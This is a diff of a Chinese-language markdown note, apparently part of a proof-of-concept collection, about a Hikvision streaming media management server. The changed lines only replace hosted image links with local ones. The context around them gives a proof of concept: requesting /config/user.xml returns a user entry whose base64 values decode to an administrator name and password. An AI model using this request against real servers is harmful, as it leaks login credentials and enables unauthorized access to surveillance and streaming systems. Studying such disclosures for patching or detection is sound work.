@@ -20,7 +20,7 @@ HIKVISION 流媒体管理服务器
 
 登陆页面
 
-![image-20220519172629739](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191726829.png)
+![image-20220519172629739](./images/202205191726829.png)
 
 POC
 
@@ -28,7 +28,7 @@ POC
 /config/user.xml
 ```
 
-![image-20220519172714407](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191727443.png)
+![image-20220519172714407](./images/202205191727443.png)
 
 ```
 <user name="YWRtaW4=" password="MTIzNDU="/>
